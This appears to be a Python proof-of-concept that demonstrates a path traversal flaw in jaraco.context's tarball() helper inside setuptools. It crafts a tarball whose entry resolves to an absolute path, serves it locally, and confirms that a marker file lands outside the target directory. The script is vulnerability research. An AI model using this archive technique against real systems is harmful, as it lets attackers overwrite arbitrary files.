#!/usr/bin/env python3
"""
Test script to trigger the tarball path traversal vulnerability.

This demonstrates how strip_first_component bypasses the security
filters in Python's tarfile module (via backports.tarfile for <3.12).
"""

import os
import sys
import shutil
import tarfile
import tempfile
import http.server
import socketserver
import threading

# Add the local setuptools to the path
SETUPTOOLS_ROOT = "/home/dyn/code/setuptools-78.1.0"
sys.path.insert(0, SETUPTOOLS_ROOT)

# Ensure we use the vendored backports.tarfile
sys.path.insert(0, os.path.join(SETUPTOOLS_ROOT, "setuptools/_vendor"))

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TARGET_DIR = "/tmp/pwned_by_tarball"


def create_test_tarball():
    """Create a tarball with a malicious entry inline."""
    import io

    tarball_data = io.BytesIO()
    with tarfile.open(fileobj=tarball_data, mode="w:gz") as tf:
        # Entry that becomes absolute after strip_first_component
        # "prefix//tmp/pwned_by_tarball/evil.txt" -> "/tmp/pwned_by_tarball/evil.txt"
        content = b"PWNED by tarball path traversal vulnerability!\n"
        info = tarfile.TarInfo(name="prefix//tmp/pwned_by_tarball/evil.txt")
        info.size = len(content)
        tf.addfile(info, io.BytesIO(content))

    tarball_data.seek(0)
    return tarball_data


class TarballHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that serves the malicious tarball."""

    tarball_data = None

    def log_message(self, format, *args):
        pass  # Suppress logging

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/gzip")
        self.send_header("Content-Length", len(self.tarball_data.getvalue()))
        self.end_headers()
        self.wfile.write(self.tarball_data.getvalue())


def run_server(port, tarball_data):
    """Run a simple HTTP server to serve the tarball."""
    TarballHandler.tarball_data = tarball_data
    with socketserver.TCPServer(("127.0.0.1", port), TarballHandler) as httpd:
        httpd.handle_request()


def main():
    print("=" * 70)
    print("Tarball Path Traversal PoC (jaraco/context.py)")
    print("=" * 70)

    # Clean up previous run
    if os.path.exists(TARGET_DIR):
        print(f"\n[*] Cleaning up previous exploit artifact: {TARGET_DIR}")
        shutil.rmtree(TARGET_DIR)

    print(f"\n[*] Before exploit:")
    print(f"    {TARGET_DIR} exists? {os.path.exists(TARGET_DIR)}")

    # Create the malicious tarball
    tarball_data = create_test_tarball()

    # Start a server to serve the tarball
    port = 18765
    server_thread = threading.Thread(target=run_server, args=(port, tarball_data))
    server_thread.daemon = True
    server_thread.start()

    print(f"\n[*] Started HTTP server on port {port}")
    print(f"[*] Tarball entry: prefix//tmp/pwned_by_tarball/evil.txt")
    print(f"[*] After strip_first_component: /tmp/pwned_by_tarball/evil.txt")

    # Import the vulnerable function
    from jaraco.context import tarball

    # Create a temp directory for the "legitimate" extraction
    with tempfile.TemporaryDirectory() as tmpdir:
        target_dir = os.path.join(tmpdir, "extracted")

        print(f"\n[*] Calling tarball() with target_dir={target_dir}")
        print(f"[*] Files should only be extracted under: {target_dir}")

        try:
            url = f"http://127.0.0.1:{port}/malicious.tar.gz"
            with tarball(url, target_dir=target_dir) as extracted:
                print(f"\n[*] Extraction complete!")
                print(f"[*] Returned path: {extracted}")

                # Show contents of the legitimate directory
                print(f"\n[*] Contents of extraction target ({target_dir}):")
                if os.path.exists(target_dir):
                    for item in os.listdir(target_dir):
                        print(f"    {item}")
                else:
                    print(f"    (directory does not exist)")

        except Exception as e:
            print(f"\n[!] Exception during extraction: {e}")
            # The vulnerability might still have triggered before the error

    # Check if the exploit worked
    print(f"\n[*] After exploit:")
    print(f"    {TARGET_DIR} exists? {os.path.exists(TARGET_DIR)}")

    evil_file = os.path.join(TARGET_DIR, "evil.txt")
    if os.path.exists(evil_file):
        print(f"\n[!] VULNERABILITY CONFIRMED!")
        print(f"    File written outside target directory!")
        print(f"\n[*] Contents of {evil_file}:")
        with open(evil_file, 'r') as f:
            print(f"    {f.read()!r}")
        return 0
    elif os.path.exists(TARGET_DIR):
        print(f"\n[!] PARTIAL SUCCESS: Directory created outside target!")
        print(f"[*] Contents of {TARGET_DIR}:")
        for item in os.listdir(TARGET_DIR):
            print(f"    {item}")
        return 0
    else:
        print(f"\n[-] Exploit did not work (vulnerability may be patched)")
        return 1


if __name__ == "__main__":
    sys.exit(main())
